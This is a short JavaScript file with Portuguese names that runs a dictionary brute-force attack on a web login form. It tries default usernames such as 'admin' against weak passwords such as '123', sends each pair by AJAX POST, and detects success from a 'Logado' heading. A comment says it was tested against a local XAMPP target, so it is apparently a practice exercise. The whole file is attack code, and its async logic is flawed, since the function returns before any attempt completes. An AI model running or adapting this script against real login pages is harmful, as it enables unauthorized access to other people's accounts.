startFB().then((res)=>{
   console.log(res);
});


function getDic() {
   return {
      logins: ['adm', 'administrador', 'admin', ],
      senhas: ['admin', '123', '1234', '12345', 'administrador', 'adm']
   }
}

async function startFB(){
   dicionario = getDic(); 

   let user = {
      login: null,
      senha: null
   }

   dicionario.logins.map(async(login)=>{
      dicionario.senhas.map(async(senha)=>{

         let data = { login: login, senha: senha };

         let response = await efetuarAtaquePost(data);

         if(verificaLogin(response.res)){
            user.login = login;
            user.senha = senha;
         }
      });
   });

   return user;
}

function verificaLogin(txt) {
   return (txt.includes('<h3>Logado</h3>'));
}

async function efetuarAtaquePost(data) {

   // Altera o caminho relativo aqui para testar (eu usei xampp, então joguei para a url: http://localhost/bf/)
   const caminho = '/bf'; 

   const urlAlvo = `${window.location.origin}${caminho}/alvo`; 

   let requisicao = {
      success: false,
      res: null
   }

   await $.ajax({
      url: urlAlvo,
      type: 'POST',
      data: data,
      success: function (res) {
         console.log(res)
         requisicao.success = true;
         requisicao.res = res;
      },
      error: function (err) {
         requisicao.success = false;
         requisicao.res = err;
      }
   });

   return requisicao;
}